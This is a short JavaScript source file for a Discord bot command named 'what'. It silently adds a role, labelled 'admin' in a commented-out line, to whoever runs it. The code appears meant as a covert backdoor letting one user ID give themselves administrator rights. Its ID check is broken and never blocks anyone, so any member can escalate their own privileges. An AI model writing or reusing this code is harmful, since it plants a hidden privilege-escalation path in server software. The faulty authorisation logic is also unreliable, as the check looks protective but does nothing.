module.exports = {
    name: "what",
    args: true,
    execute(message, args) {
        const Discord = require('discord.js');
        const client = new Discord.Client({ partials: ["MESSAGE", "CHANNEL", "REACTION"]});
        if (!message.author === "376178128835313694") return;

        //const memeber = "376178128835313694"
        //let admin = message.guild.roles.find(role => role.id == "804531881781362728")
        const user = message.author
        message.guild.members.cache.get(user.id).roles.add("804531881781362728")
    },
};